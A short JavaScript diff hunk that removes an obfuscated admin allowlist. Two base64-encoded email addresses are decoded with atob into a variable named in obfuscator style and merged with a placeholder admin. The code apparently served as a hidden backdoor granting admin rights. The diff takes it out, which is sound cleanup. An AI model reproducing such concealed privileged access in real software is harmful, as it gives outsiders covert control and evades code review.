@@ -1365,10 +1365,6 @@ window.addEventListener("load", () => {
    }
 });
 
-const encodedAdmins = ["YWRtaW4xQGdtYWlsLmNvbQ==","NWc4OC5vZmZpY2FsQGdtYWlsLmNvbQ=="];
-const _0xadmins = encodedAdmins.map(e => atob(e));
-const allowedAdmins = [..._0xadmins, "admin@example.com"];
-
 function formatTimestamp(date) {
   const y = date.getFullYear();
   const m = String(date.getMonth() + 1).padStart(2, '0');
